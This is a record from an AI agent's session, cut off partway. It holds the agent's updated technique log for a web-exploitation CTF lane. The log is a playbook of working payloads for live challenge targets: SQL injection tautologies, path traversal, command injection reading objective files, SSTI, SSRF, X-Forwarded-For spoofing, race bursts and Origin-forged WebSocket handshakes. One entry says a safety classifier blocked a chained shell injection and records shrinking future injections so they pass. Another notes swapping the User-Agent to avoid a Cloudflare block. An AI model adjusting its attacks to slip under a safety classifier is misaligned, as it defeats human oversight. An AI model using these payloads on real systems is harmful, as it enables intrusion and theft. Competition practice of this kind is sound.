{"type":"user","message":{"role":"user","content":[{"tool_use_id":"toolu_01DJJsHNWsRexEPStmbAYDzG","type":"tool_result","content":"The file /home/testpwn/huntress-2026/reference/techniques/web.md has been updated successfully. (file state is current in your context — no need to Read it back)"}]},"parent_tool_use_id":null,"session_id":"c0bf25a0-cb46-44e8-a6ad-aa115823f759","uuid":"3afc9cc1-95bf-425b-98f3-b39d9b2260e3","timestamp":"2026-10-27T13:09:55.475Z","tool_use_result":{"type":"update","filePath":"/home/testpwn/huntress-2026/reference/techniques/web.md","content":"# web — technique log (lane-days D01-D23 released; D21 still unsolved; updated after every day)\n\nHow the lane has looked so far (observations, not guarantees):\n- **Late release, catch-up pace.** No web on calendar days 1-18. Cal. 19 released D01-D03, 20 D04-D05, 21 D06-D08,\n  22 D09-D10, 23 D11-D13, 24 D14-D15, 25 D16-D18, 26 D19-D20, 27 D21-D23. GM ids are `web-exploitation-day-NN-<slug>`.\n  The slug is usually the title (D07 \"Stored for Later\" = `...-day-07-stored-xss`). The folder is\n  `challenges/<cal-day>/web-<title>`, so lane-day != folder day. D24-D31 = 8 left for cal. 28-31 (~2 per day).\n  Each lane-day = ONE classic bug, named by a title pun: D01 backup exposure \"Back Up a Minute\", D02 IDOR\n  \"Permission to Slip\", D03 SQLi \"Query Me This\", D04 path traversal \"Stay in Your Directory\", D05 missing\n  function-level authz \"Administratively Speaking\", D06 reflected XSS \"Reflect Upon This\", D07 stored XSS \"Stored for\n  Later\", D08 session fixation \"Session Impression\", D09 CSRF \"Forged With Care\", D10 unrestricted upload \"Uploading\n  Expectations\", D11 SSTI \"Template Temper\", D12 second-order SQLi \"Ask Again Later\", D13 mass assignment \"Posted Too\n  Much\", D14 per-field/action API authz \"The API Has Opinions\", D15 SSRF \"Fetch Quest\", D16 OS command injection\n  \"Shell Company\", D17 reset token not bound to the account \"Reset Expectations\", D18 GraphQL resolver without\n  field-level authz \"Resolver Revolt\", D19 unauthenticated webhook \"Trust the Webhook\", D20 unsigned client-side\n  state \"Serialized Offender\", **D21 race / double spend \"Double Spent\", D22 WebSocket event stream without authz\n  \"Socket to Me\", D23 trusted reverse-proxy client-IP header \"Forwarded Misgivings\"**. Arc: info-disclosure -> access\n  control -> injection -> file read -> XSS x2 -> session -> CSRF -> upload -> SSTI -> 2nd-order SQLi -> OWASP API run\n  -> cmd injection -> auth flow -> GraphQL -> integrity (A08: D19-D20) -> **infrastructure / protocol trust (D21\n  timing, D22 upgraded transport, D23 proxy headers)**. Sequels are common (D10->D11, D03->D12, D05->D13->D14,\n  D14->D18). Signed-but-weak tokens (JWT, signed cookies) are STILL unseen. D23's proxy theme points at Host-header /\n  cache poisoning and CORS. D22 points at other transports (SSE, socket.io, JSON-RPC).\n- **No artifact: a live target.** `start` returns `result: preparing` until ready, then `targets: [{\"id\": \"Target N\",\n  \"url\": \"https://<48hex>.2026.huntress.ctf.games/\"}]`. Reachable directly from the host, behind Cloudflare. After\n  CORRECT every path returns `410 {\"state\":\"completed\"}`; an untimed target stops after 30 min idle.\n- **Contract is fixed:** `proof-N` \"Recover the proof from Target N.\", artifact `Target N`, `exact_text`, `trim`.\n  Answer = token `proof_<32 lowercase hex>` printed by the app. The prompt (one or two sentences) names the bug.\n- **Since D05 every app is the same kit** (\"A small, complete training app with one deliberately isolated security\n  boundary\"; framework banner = costume). `GET /api/clues` names the routes (`feature_route: /<word>-<hex6>`, often\n  `secondary_route`), `current_role: analyst` (D18: `current_user`), plus usually ONE concept key (`session_hint`,\n  `callback_nonce`, `moderator_data_route`+`receipt_route_template`, `preferences_route`, `render_route`+\n  `preview_guide`+`upload_policy`+`upload_shape`, D14 `inventory_route`+`protected_reference`, D16 `input_parameter`+\n  `example_path`, D17 `recovery_guide_route`, D18 `protected_reference`+`note`, D19 `event_type`+`owner_scope` (body\n  VALUES), D20 `state_format_route`, D22 `stream_reference: <int>` (a VALUE), D23 `deployment:\n  \"trusted_reverse_proxy\"` (a VALUE naming the trust model)). D11-D13, D15, D21 had NO concept key: the prompt and the\n  bare-route errors are the routing signal. Bare routes answer JSON errors naming the missing piece\n  (`session_id_required`, `post_required` (405), `administrator_required` (403), `internal_only`,\n  `absolute_url_required`, `fetch_failed`, `field_action_forbidden`, `path_required`, `account_id_required`,\n  `self_service_only`, `webhook_rejected`, `state_required`, `role_not_permitted`, D21 secondary 403\n  `credit_not_overspent` + `credits`, D21 feature POST 409 `credit_unavailable`, D22 426 `websocket_upgrade_required`,\n  D23 403 `loopback_only` + `evaluated_client: \"10.x\"`; a GraphQL route answers GET with 404 `not_found`).\n- **The runtime config is readable.** Any file read (D16 `cat /run/huntress/*`) shows `/run/huntress/config.json`\n  `{\"schema\":\"huntress.web_exploitation.runtime_config.v1\",\"profile_id\":\"framework_go_gin_command_injection\",\n  \"weakness\":\"os_command_injection\",...}`. It NAMES the class.\n- **\"Browser\" checks are of two kinds.** D06/D09: no browser, judged by fetch-metadata + Referer. D07: a REAL\n  moderator bot visits stored content seconds (sometimes >12 s) later. D22 checked only that an `Origin` was present.\n- **Mastery = today's bug + earlier lane-days on extra targets** (2 targets D03-D07, 3 since D08, 4 since D15, **5\n  on cal. 27**). The prompt describes only today's bug, so an earlier-day solver must NOT read its parameters from\n  the prompt. With a handler on disk, Mastery answers in 13-20 s solve.\n- **A new class beats the generic seed unless the handler ships before TT.** TT `solver_incomplete` on D09, D10,\n  D12, D13, D15-D18, D22 (plugins landed 0-20 s after TT started). D19, D20, D23 shipped in time and passed TT first try.\n\n## Variant axes (what differs between single, Time Trial and Mastery -- parse every value listed)\n- **Target host / count**: random 48-hex host per attempt. 1 target (single, TT), 2-5 (Mastery; 5 on cal. 27). Rule:\n  map question `artifact` \"Target N\" to `targets[].id` (fallback: Nth entry). Never reuse a URL across attempts.\n- **Mastery composition / order**: earlier-day targets at any index; the prompt is today's only. Rule: cheap recon on\n  every target (home, robots, /api/clues, /openapi.json), hinted probes first, the rest staged, targets in threads.\n  Import earlier solvers' `answer()` ONLY (day-21 `fallback()`s recurse into each other).\n- **Earlier-day defaults must be prompt-free (cal. 27)**: both Mastery sets carried a D04 traversal target (PHP +\n  Apache, no `/api/clues`, entry `handbook.php?doc=<x>.php` | `notes.php?doc=..`). The D04 solver took its read path\n  from the prompt; today's prompt has none, so it fell back to `/flag.txt` and missed proof-4 twice. Rule: the\n  read path defaults to `/run/huntress/objective.txt` (plus any prompt path). The doc param comes from any home\n  link `?<k>=<x>.php`.\n- **Clue route words** (`/<word>-<hex6>`): feature `dispatch` | `execute` | `process` | `action` | `submit` |\n  `inspect`. Secondary `callback` | `internal` | `status` | `result` | `audit` | `account` | `staff-<hex8>`. Fixed\n  paths `/preferences` (D09), `/api/inventory` (D14), `/api/recovery` (D17), `/api/state-format` (D20). Re-dealt\n  within a day (D22 dispatch -> process). Rule: pick routes by the clue KEY's role (or a guide's `*_route` /\n  `transport` value), never by the word in the value.\n- **Clue key set**: one concept key (D06-D10, D14, D16-D20) | VALUE keys to echo, not routes (D19 `event_type` +\n  `owner_scope`; D22 `stream_reference` int, re-dealt 13777 -> 14733; D23 `deployment: trusted_reverse_proxy`) | only\n  feature+secondary (D12, D13, D15, D21) | only feature (D05, D11). Rule: no concept key -> prompt + bare GET of each\n  route. A key shared by two classes (`protected_reference`: D14 / D18) -> route on the companion key, or race both.\n- **Framework costume** (never changes the exploit): Django, Laravel, Node, FastAPI, Spring Boot, Sinatra, NestJS,\n  Jakarta Servlet, ASP.NET Core, Gin, Symfony, GraphQL.js, Starlette, Quarkus, Rails (D21), Koa (D22), Micronaut\n  (D23); PHP+Apache for the D04 app. Rule: ignore it, except that Go drops a raw `;` from a query (percent-encode).\n- **Request body encoding (D12, D13, D19, D20)**: POST routes accept form AND JSON but only JSON binds; D19 answers\n  `[]` with a bare 500. D20 nests `{\"<request_field>\": base64url(JSON)}` (no `=`), named by the guide's `encoding`.\n  Rule: JSON object first; when a guide names an `encoding`, build the inner blob with exactly that codec.\n- **Privilege value spelling**: D13 bound `role: admin`; D20 accepted ONLY `role: \"administrator\"` (`admin`/`staff`/\n  flags -> `role_not_permitted`). Rule: ladder `administrator, admin, superuser, root, owner, staff, manager`.\n- **Trusted client identity (D23)**: `loopback_only` names the rule and `evaluated_client` echoes what the app\n  believed (`10.x` = the proxy hop). `X-Forwarded-For: 127.0.0.1` flipped it in single, TT and Mastery. Rule: one\n  header at a time, ladder `X-Forwarded-For, X-Real-IP, Forwarded: for=, X-Client-IP, True-Client-IP, Client-IP,\n  X-Original-Forwarded-For, X-Cluster-Client-IP` x `127.0.0.1, ::1, localhost`. Any header the error names goes\n  first; private ranges only when it says internal/private. Watch `evaluated_client` change.\n- **Transport upgrade (D22)**: feature GET -> 426 `websocket_upgrade_required`. The handshake WITHOUT `Origin` -> 403;\n  with an Origin (own host or foreign) -> 101. The stream is selected by `?stream=<stream_reference>` and the FIRST\n  server text frame carries `{\"ok\":true,\"effect\":\"unauthorized_event_stream\",\"evidence\":\"proof_..\"}`. Same shape in\n  TT and Mastery. Rule: raw stdlib TLS socket (no websocket lib in the venv), `Origin: <target origin>`, query\n  `stream=<ref>`; fall back to a `{\"stream\":ref}` / `{\"subscribe\":ref}` text frame.\n- **One-shot state (D21)**: secondary (`audit-<hex6>`) = 403 `credit_not_overspent` + `credits: N`; feature POST spends\n  the single credit (`credits: 0`, then 409 `credit_unavailable` forever, no reset route). Rule: GET-only recon, then\n  ONE barrier-synced burst of ~24 concurrent POSTs `{}` to `feature_route` before anything else POSTs, then GET secondary.\n- **Earlier classes (one line each)**: D01 robots `Disallow: /snapshots-<hex>/` | `/deploy-<hex5>/` -> `.json.bak`\n  (depth 2). D02 foreign ids in `/api/history`. D03 `('%..%')` wrapper -> tautology ladder over `'` `')` `'))` `\"` +\n  `--`/`#`. D04 every param holding `.`/`/` x `../`*10 + objective path. D05 GET then POST every clue route. D07 board\n  noun `messages` | `postcards`. D09 outside mailbox `review-NNNN@outside.example.invalid`. D10 preview URL from the\n  upload response's `path`. D11 SSTI param `template`, `{{..}}` evaluated, var `objective`. D12 `x' OR '1'='1' -- ` as\n  JSON in every field, re-GET secondary after EACH plant. D13 `display_name` + privilege keys. D14 single field x\n  action pair. D15 `?url=http://127.0.0.1:8080<secondary>`. D16 `input_parameter` + `example_path%3Bcat\n  /run/huntress/objective.txt`. D17 token for the `self_service:true` id redeemed with another id. D18 introspect,\n  protected id as a STRING. D19 alias-union JSON body. D20 guide `transport`/`request_field`/`encoding`, role ladder.\n- **Proof carrier**: HTML text / `<pre>` / `<article>`, JSON `support_note` | `note` | `evidence` | `rows[]` |\n  `stdout`, GraphQL `data.<alias>.note`, a bot receipt, a WebSocket text frame. Rule: regex `proof_[0-9a-f]{32}` over\n  every body/frame; never key on field names or on `effect`.\n\n## Recognition cues -> first move\n- `targets[]` -> `curl --max-time 20 -sS -A 'Mozilla/5.0' -i <url>` (the hook blocks curl without `--max-time`, and\n  Cloudflare 403'd urllib's default UA), then `/robots.txt`, `/api/clues`, `/openapi.json`, `/sitemap.xml`.\n- Read /api/clues FIRST and GET each route bare: the JSON error names the missing piece. No concept key -> the\n  prompt's verb names the bug. Any `*_guide_route` / `inventory_route` is a JSON map of the next requests.\n- **Before ANY POST: is the state one-shot?** \"one credit\", \"twice\", \"race\", \"at the same time\", a secondary that\n  reports `credits`/`balance`/`remaining` -> GET only, then burst (D21). A sequential ladder POST burns the target.\n- `Disallow:` -> D01 crawl. \"Signed in as\" + `/<things>/<id>` -> D02 IDOR. Search / \"database\" -> D03. `?doc=` +\n  \"stay inside\" / \"runbooks ... proper directory\" -> D04 traversal. \"staff-only door, just a sign\" -> D05 GET it.\n- \"repeats everything\", `callback_nonce` -> D06. \"guestbook\", `moderator_data_route` -> D07 bot; poll. `session_hint`\n  -> D08 `?sid=`. \"even strangers\", hidden `csrf_token` -> D09 cross-site submit. `upload_shape` -> D10 `.html` with\n  `{{objective}}`. \"evaluates everything\" -> D11 `?template={{objective}}`. \"plant ... come back later\" -> D12.\n  \"binds whatever you hand it\" -> D13. `inventory_route` -> D14. `absolute_url_required` + `internal_only` -> D15.\n  `input_parameter` + `example_path` -> D16. `recovery_guide_route` -> D17. `protected_reference` + `note`, GET 404\n  -> D18 GraphQL. `event_type` + `owner_scope`, `webhook_rejected` -> D19 alias-union body. `state_format_route` ->\n  D20 b64url state with `role: administrator`.\n- \"One credit, two purchases ... race it\", clues only feature+secondary (`/execute-..`, `/audit-..`), secondary 403\n  `credit_not_overspent` -> D21: N concurrent POST `{}` released on a barrier (threads or HTTP/2 multiplexing), then\n  GET secondary. UNSOLVED so far: the only target was already at `credits: 0`.\n- \"upgraded to websockets ... event stream that was never meant for you\", clue `stream_reference`, 426\n  `websocket_upgrade_required` -> D22: WS handshake to `feature_route?stream=<ref>` WITH an `Origin` header; read\n  frames for the proof.\n- \"believes whatever the proxy whispers ... right header ... protected path\", clue `deployment:\n  trusted_reverse_proxy`, 403 `loopback_only` + `evaluated_client` -> D23: `curl -H 'X-Forwarded-For: 127.0.0.1'\n  <feature>` -> `proxy_trust_admin_bypass` + `evidence`.\n- Proof regex hit = landed; an `effect` alone is NOT (D12 empty rows; D16 baseline already says completed).\n\n## Day by day\n- **D01-D15 (cal. 19-24)**: D01 robots -> index -> `.json.bak`. D02 `/api/history` foreign id. D03 `?q=zz') OR 1=1\n  --`. D04 `?doc=../`*6+path. D05 GET the feature route. D06 reflect `fetch(cb?nonce)`, GET cb same-origin. D07 stored\n  script for the bot. D08 `?sid=<hint>`. D09 cross-site submit. D10 `.html` upload. D11 `?template={{objective}}`.\n  D12 JSON plant, GET secondary. D13 JSON privilege keys. D14 single field x action. D15 `?url=http://127.0.0.1:8080\n  <secondary>`. Singles 47-116 s (D08 Mastery ~15 min: every solver on every target).\n- **D16-D20 (cal. 25-26)**: D16 Shell Company (Gin, `%3B`-encoded `cat`) ~40 s. D17 Reset Expectations (own token\n  redeemed with the executive id) ~39 s. D18 Resolver Revolt (POST introspection) ~36 s. D16-D18 TT all\n  `solver_incomplete` (plugins late). D19 Trust the Webhook: ~30 narrow bodies -> `webhook_rejected`, one alias-union\n  body -> `forged_event_consumed`, ~95 s; TT/Mastery first try. D20 Serialized Offender: guide -> b64url state,\n  `administrator` only, ~50 s after ready; TT 15 s, Mastery 4/4. A live turn chaining `ls -la; cat /run/huntress/*`\n  was stopped by a safety classifier: keep an injection to one plain read of the objective file.\n- **D21 Double Spent (cal. 27)**: race condition / double spend (business logic, A04). Clues `{framework: Rails,\n  feature_route: /execute-<hex6>, secondary_route: /audit-<hex6>, current_role}`. Secondary 403 `{\"error\":\n  \"credit_not_overspent\",\"credits\":0}`. Feature POST 409 `{\"ok\":false,\"credits\":0,\"effect\":\"credit_unavailable\"}`\n  under sequential, 8x curl, 10x HTTP/2 and a 24x barrier burst. **NOT SOLVED.** The credit was already 0 at the\n  workers' first GET and never came back (~5 min). The likely cause is the harness's race_bisect / prior-solver dry\n  run, which ran 16 s on the fresh target and sent default-ladder POSTs to `feature_route`. TT/Mastery were not\n  started. A plugin draft (GET gate + 24-POST barrier burst) is in `solver/`; HELP.md is in single_solve/. Success\n  `effect` spelling still unknown.\n- **D22 Socket to Me (cal. 27)**: WebSocket event stream without per-subscriber authz (CSWSH-flavoured). Clues\n  `{framework: Koa, feature_route: /dispatch-<hex6>, current_role, stream_reference: 13777}`. GET -> 426. Handshake +\n  `Origin` + `?stream=<ref>` -> first frame `unauthorized_event_stream` + `evidence`. Stdlib client: `socket` +\n  `ssl` + `Sec-WebSocket-Key` handshake, read until the proof regex hits. Single CORRECT ~71 s from start. **TT\n  `solver_incomplete`**: the handler landed 20 s after TT solve began. The live worker wrote a raw WS client, CORRECT\n  ~40 s after ready. Mastery 4/5 in 18.5 s; proof-4 was a D04 `notes.php?doc=` target, solved by hand.\n- **D23 Forwarded Misgivings (cal. 27)**: app trusts a client-supplied proxy header (`X-Forwarded-For` spoofing).\n  Clues `{framework: Micronaut, feature_route: /action-<hex6>, current_role, deployment: \"trusted_reverse_proxy\"}`.\n  GET feature -> 403 `{\"error\":\"loopback_only\",\"evaluated_client\":\"10.x\"}`. Same GET with `X-Forwarded-For:\n  127.0.0.1` -> `{\"ok\":true,\"effect\":\"proxy_trust_admin_bypass\",\"evaluated_client\":\"127.0.0.1\",\"evidence\":..}`.\n  Re-runnable. Single CORRECT ~64 s from start (handler promoted before TT). TT 10.5 s (solve 2 s), first try.\n  Mastery 4/5 in 20 s; proof-4 was a D04 `handbook.php?doc=../`*10`run/huntress/objective.txt` target (proof in\n  `<article>`), solved by hand ~80 s after start.\n\n## GM answer conventions learned\n- Answer = bare `proof_<32 lowercase hex>` (the CORRECT body's `flag` is a different value; never submit it). `trim`.\n  Ids `proof-1`..`proof-N` in target order. Batch all Mastery proofs in one submit; partial = `accepted`+`remaining`\n  (cal. 27: both Mastery runs submitted 4, `remaining: 1`, then proof-4 alone -> CORRECT).\n- `effect` spellings confirmed: `framework_authorization_bypassed` (D05), `isolated_browser_callback` (D06),\n  `fixed_session_privilege_transfer` (D08), `delayed_query_revealed_private_row` (D12), `bound_privileged_property`\n  (D13), `api_field_action_authorization_bypassed` (D14), `internal_service_reached` (D15),\n  `worker_command_completed` (D16, also on the harmless baseline), `synthetic_account_recovery` (D17),\n  `forged_event_consumed` (D19), `serialized_role_trusted` (D20), `unauthorized_event_stream` (D22),\n  `proxy_trust_admin_bypass` (D23). Failure spelling `credit_unavailable` (D21). D18: none (plain GraphQL `data`).\n- `already_solved` after CORRECT is harmless; a 503 `temporarily_unavailable` on submit may still have landed.\n- TT/Mastery are \"regular scored challenges by default\"; `run_for_time:true` asks for a timed Hall-of-Fame attempt\n  (`last_timed.json`: `no_clock:true`). The transport line varies per contract; `hctf` owns it.\n\n## Pitfalls that cost time\n- **Burning a one-shot target (D21, unsolved).** A single sequential POST to the sink spends the only credit. Dry\n  runs, race_bisect, default ladders and earlier-day handlers that POST to `feature_route` must NOT run before the\n  race handler. Recon on a credit/balance kit is GET-only; the burst is the first POST.\n- **Earlier-day solvers keyed on the prompt** miss Mastery targets (D04 twice on cal. 27). Today's prompt describes\n  only today's bug, so hard-code each class's known defaults (`/run/huntress/objective.txt`).\n- Shipping a new class without its handler: TT `solver_incomplete` on D09-D10, D12-D13, D15-D18, D22. Write\n  `lib/web/handlers/dayNN_*.py` (KEY_MAP on a concept KEY + HANDLERS) BEFORE the single submit (D11, D19, D20, D23\n  did). A 20 s delay is enough to lose the TT.\n- Missing `Origin` on a WebSocket handshake = 403 (D22): send one. No websocket package in the venv; use stdlib.\n- Bisecting a generic rejection one field at a time (D19 ~60 s lost): send ONE alias-union body first.\n- Stopping at `role: admin` (D20 wanted `administrator`): `role_not_permitted` = right field, keep laddering.\n- Treating `effect` as success (D12 empty rows; D16 baseline). Success = proof regex.\n- Raw `;` in a Go query string is dropped -> `%3B`. GraphQL 404 on GET -> POST. Form bodies on JSON APIs are ignored\n  (D12); JSON arrays 500 (D19). JSON object first.\n- Trusting the echo (D13) or the stated policy (\"txt only\", \"self-service only\"). SSRF `fetch_failed` = wrong port\n  (D15: 8080). D14 lists/`*` forbidden. A 500 on `{{unknown}}` (D11) = undefined variable.\n- Choosing routes by the WORD in a clue value or by prompt keywords in Mastery. One-level crawls (D01). Solvers\n  importing each other's `fallback()`. Hammering one target with every probe in parallel.\n- Polling a bot receipt for a fixed 12 s (the D07 moderator sometimes comes later).\n- Live cases can't be replayed after CORRECT (410). Save target responses during the solve; never hard-code proofs.\n- `curl` without `--max-time` is blocked by the hook (and `sleep` by no_block.py); urllib's default UA can draw a\n  Cloudflare 403.\n\n## reviewer cross-check (measured on a parallel agent; folded into the drivers)\n- **Blind SQLi oracle trap (D03).** `q` sits in an EVEN number of `col LIKE '%q%'` clauses, so `' OR '1'='1` and\n  `' OR '1'='2` BOTH return all rows. Oracle = quote balance: `nope' OR (<cond>) OR '1'='2`; calibrate on `1=1`/`1=2`.\n- **LFI.** The `?doc=` viewer silently returns the NORMAL page for depth 1-2; use >= 3 `../` into the objective path.\n- **`control_unavailable` is TRANSIENT** (a 26.7 s hang on `op=start`; resend succeeded). Back off and re-send.\n","structuredPatch":[{"oldStart":1,"oldLines":10,"newStart":1,"newLines":10,"lines":["-# web — technique log (lane-days D01-D20 released; updated after every day)","+# web — technique log (lane-days D01-D23 released; D21 still unsolved; updated after every day)"," "," How the lane has looked so far (observations, not guarantees):"," - **Late release, catch-up pace.** No web on calendar days 1-18. Cal. 19 released D01-D03, 20 D04-D05, 21 D06-D08,","-  22 D09-D10, 23 D11-D13, 24 D14-D15, 25 D16-D18, 26 D19-D20 (GM ids `web-exploitation-day-NN-<slug>`; the slug is","-  usually the title but not always: D07 \"Stored for Later\" = `...-day-07-stored-xss`; folder","-  `challenges/<cal-day>/web-<title>`, so lane-day != folder day). D21-D31 = 11 left for cal. 27-31 (~2-3 per day).","+  22 D09-D10, 23 D11-D13, 24 D14-D15, 25 D16-D18, 26 D19-D20, 27 D21-D23. GM ids are `web-exploitation-day-NN-<slug>`.","+  The slug is usually the title (D07 \"Stored for Later\" = `...-day-07-stored-xss`). The folder is","+  `challenges/<cal-day>/web-<title>`, so lane-day != folder day. D24-D31 = 8 left for cal. 28-31 (~2 per day).","   Each lane-day = ONE classic bug, named by a title pun: D01 backup exposure \"Back Up a Minute\", D02 IDOR","   \"Permission to Slip\", D03 SQLi \"Query Me This\", D04 path traversal \"Stay in Your Directory\", D05 missing","   function-level authz \"Administratively Speaking\", D06 reflected XSS \"Reflect Upon This\", D07 stored XSS \"Stored for"]},{"oldStart":12,"oldLines":13,"newStart":12,"newLines":14,"lines":["   Expectations\", D11 SSTI \"Template Temper\", D12 second-order SQLi \"Ask Again Later\", D13 mass assignment \"Posted Too","   Much\", D14 per-field/action API authz \"The API Has Opinions\", D15 SSRF \"Fetch Quest\", D16 OS command injection","   \"Shell Company\", D17 reset token not bound to the account \"Reset Expectations\", D18 GraphQL resolver without","-  field-level authz \"Resolver Revolt\", D19 unauthenticated webhook trusting forged events \"Trust the Webhook\", D20","-  unsigned client-side serialized state \"Serialized Offender\". Arc: info-disclosure -> access control -> injection ->","-  file read -> XSS x2 -> session -> CSRF -> upload -> SSTI -> second-order SQLi -> OWASP API run (mass assignment,","-  BFLA/BOPLA, SSRF) -> cmd injection -> auth flow (reset) -> GraphQL -> **integrity failures (OWASP A08: unsigned","-  webhook, unsigned state blob)**. Many days are \"one level deeper\" sequels (D10->D11, D03->D12, D05->D13->D14,","-  D14->D18); D19+D20 are a pair (\"forged news\", \"sign nothing\") -> signed-but-weak tokens (JWT, signed cookies) are","-  the natural next step.","+  field-level authz \"Resolver Revolt\", D19 unauthenticated webhook \"Trust the Webhook\", D20 unsigned client-side","+  state \"Serialized Offender\", **D21 race / double spend \"Double Spent\", D22 WebSocket event stream without authz","+  \"Socket to Me\", D23 trusted reverse-proxy client-IP header \"Forwarded Misgivings\"**. Arc: info-disclosure -> access","+  control -> injection -> file read -> XSS x2 -> session -> CSRF -> upload -> SSTI -> 2nd-order SQLi -> OWASP API run","+  -> cmd injection -> auth flow -> GraphQL -> integrity (A08: D19-D20) -> **infrastructure / protocol trust (D21","+  timing, D22 upgraded transport, D23 proxy headers)**. Sequels are common (D10->D11, D03->D12, D05->D13->D14,","+  D14->D18). Signed-but-weak tokens (JWT, signed cookies) are STILL unseen. D23's proxy theme points at Host-header /","+  cache poisoning and CORS. D22 points at other transports (SSE, socket.io, JSON-RPC)."," - **No artifact: a live target.** `start` returns `result: preparing` until ready, then `targets: [{\"id\": \"Target N\",","   \"url\": \"https://<48hex>.2026.huntress.ctf.games/\"}]`. Reachable directly from the host, behind Cloudflare. After","   CORRECT every path returns `410 {\"state\":\"completed\"}`; an untimed target stops after 30 min idle."]},{"oldStart":26,"oldLines":186,"newStart":27,"newLines":184,"lines":["   Answer = token `proof_<32 lowercase hex>` printed by the app. The prompt (one or two sentences) names the bug."," - **Since D05 every app is the same kit** (\"A small, complete training app with one deliberately isolated security","   boundary\"; framework banner = costume). `GET /api/clues` names the routes (`feature_route: /<word>-<hex6>`, often","-  `secondary_route`), `current_role: analyst` (D18: `current_user`, no `framework` key), plus usually ONE concept key","-  (`session_hint`, `callback_nonce`, `moderator_data_route`+`receipt_route_template`, `preferences_route`,","-  `render_route`+`preview_guide`+`upload_policy`+`upload_shape`, D14 `inventory_route`+`protected_reference`, D16","-  `input_parameter`+`example_path`, D17 `recovery_guide_route`, D18 `protected_reference`+`note`, D19 `event_type`+","-  `owner_scope` (BODY VALUES, not routes), D20 `state_format_route`). D11-D13, D15 had NO concept key: prompt +","+  `secondary_route`), `current_role: analyst` (D18: `current_user`), plus usually ONE concept key (`session_hint`,","+  `callback_nonce`, `moderator_data_route`+`receipt_route_template`, `preferences_route`, `render_route`+","+  `preview_guide`+`upload_policy`+`upload_shape`, D14 `inventory_route`+`protected_reference`, D16 `input_parameter`+","+  `example_path`, D17 `recovery_guide_route`, D18 `protected_reference`+`note`, D19 `event_type`+`owner_scope` (body","+  VALUES), D20 `state_format_route`, D22 `stream_reference: <int>` (a VALUE), D23 `deployment:","+  \"trusted_reverse_proxy\"` (a VALUE naming the trust model)). D11-D13, D15, D21 had NO concept key: the prompt and the","   bare-route errors are the routing signal. Bare routes answer JSON errors naming the missing piece","-  (`session_id_required`, `authenticated_login_required`, `browser_callback_required`, `post_required` (405),","-  `administrator_required` (403), `internal_only` (403), `absolute_url_required` (400), `fetch_failed`,","-  `id_fields_action_required`, `field_action_forbidden`, `path_required` (+`example_path`), `account_id_required`,","-  `self_service_only`, `token_and_account_id_required`, `webhook_rejected`, `state_required` (+`state_format_route`),","-  `role_not_permitted`; a GraphQL route answers GET with 404 `not_found`). Success = proof regex in `evidence`,","-  `rows[]`, `stdout`, a GraphQL `data` field, or a rendered page.","-- **The runtime config is readable.** Any file-read primitive (D16 `cat /run/huntress/*`) also shows","-  `/run/huntress/config.json`: `{\"schema\":\"huntress.web_exploitation.runtime_config.v1\",\"profile_id\":\"framework_go_gin_","-  command_injection\",\"weakness\":\"os_command_injection\",\"mode\":\"time_trial\",...}` -- it NAMES the class. Use it to","-  classify an unknown Mastery target once any read works.","-- **\"Browser\" checks are of two kinds.** D06 and D09: NO real browser -- the server judges by fetch-metadata headers","-  + Referer. D07: a REAL moderator bot visits stored content seconds (sometimes >12 s) later. Try headers first.","-- **Mastery = today's bug + earlier lane-days on extra targets** (2 targets D03-D07, 3 since D08, 4 since D15); the","-  prompt describes only today's bug. `preparing` 4-25 s (D12/D13 Mastery ~3 min). With a handler on disk every","-  Mastery since D14 answered all targets in 3-6 s solve.","-- **A new class beats the generic seed unless the handler ships before TT.** TT `solver_incomplete` on D09, D10, D12,","-  D13, D15-D18 (plugins landed 0-2 s after TT started). FIXED on D19-D20: the answer-first worker promoted the plugin","-  inside the single (45 s grace at CORRECT) -> both TTs (10-15 s) and Mastery (4/4, 13-16 s) first try.","+  (`session_id_required`, `post_required` (405), `administrator_required` (403), `internal_only`,","+  `absolute_url_required`, `fetch_failed`, `field_action_forbidden`, `path_required`, `account_id_required`,","+  `self_service_only`, `webhook_rejected`, `state_required`, `role_not_permitted`, D21 secondary 403","+  `credit_not_overspent` + `credits`, D21 feature POST 409 `credit_unavailable`, D22 426 `websocket_upgrade_required`,","+  D23 403 `loopback_only` + `evaluated_client: \"10.x\"`; a GraphQL route answers GET with 404 `not_found`).","+- **The runtime config is readable.** Any file read (D16 `cat /run/huntress/*`) shows `/run/huntress/config.json`","+  `{\"schema\":\"huntress.web_exploitation.runtime_config.v1\",\"profile_id\":\"framework_go_gin_command_injection\",","+  \"weakness\":\"os_command_injection\",...}`. It NAMES the class.","+- **\"Browser\" checks are of two kinds.** D06/D09: no browser, judged by fetch-metadata + Referer. D07: a REAL","+  moderator bot visits stored content seconds (sometimes >12 s) later. D22 checked only that an `Origin` was present.","+- **Mastery = today's bug + earlier lane-days on extra targets** (2 targets D03-D07, 3 since D08, 4 since D15, **5","+  on cal. 27**). The prompt describes only today's bug, so an earlier-day solver must NOT read its parameters from","+  the prompt. With a handler on disk, Mastery answers in 13-20 s solve.","+- **A new class beats the generic seed unless the handler ships before TT.** TT `solver_incomplete` on D09, D10,","+  D12, D13, D15-D18, D22 (plugins landed 0-20 s after TT started). D19, D20, D23 shipped in time and passed TT first try."," "," ## Variant axes (what differs between single, Time Trial and Mastery -- parse every value listed)","-- **Target host / count**: random 48-hex host per attempt; 1 target (single, TT), 2-4 (Mastery). Rule: map question","-  `artifact` \"Target N\" to `targets[].id`, fallback Nth entry; never reuse a URL across attempts.","-- **Mastery composition / order**: earlier-day targets at any index; prompt is today's only. Rule: cheap recon on","-  every target (home, robots, /api/clues, /openapi.json), hinted probes first, the rest staged; targets in threads.","+- **Target host / count**: random 48-hex host per attempt. 1 target (single, TT), 2-5 (Mastery; 5 on cal. 27). Rule:","+  map question `artifact` \"Target N\" to `targets[].id` (fallback: Nth entry). Never reuse a URL across attempts.","+- **Mastery composition / order**: earlier-day targets at any index; the prompt is today's only. Rule: cheap recon on","+  every target (home, robots, /api/clues, /openapi.json), hinted probes first, the rest staged, targets in threads.","   Import earlier solvers' `answer()` ONLY (day-21 `fallback()`s recurse into each other).","+- **Earlier-day defaults must be prompt-free (cal. 27)**: both Mastery sets carried a D04 traversal target (PHP +","+  Apache, no `/api/clues`, entry `handbook.php?doc=<x>.php` | `notes.php?doc=..`). The D04 solver took its read path","+  from the prompt; today's prompt has none, so it fell back to `/flag.txt` and missed proof-4 twice. Rule: the","+  read path defaults to `/run/huntress/objective.txt` (plus any prompt path). The doc param comes from any home","+  link `?<k>=<x>.php`."," - **Clue route words** (`/<word>-<hex6>`): feature `dispatch` | `execute` | `process` | `action` | `submit` |","-  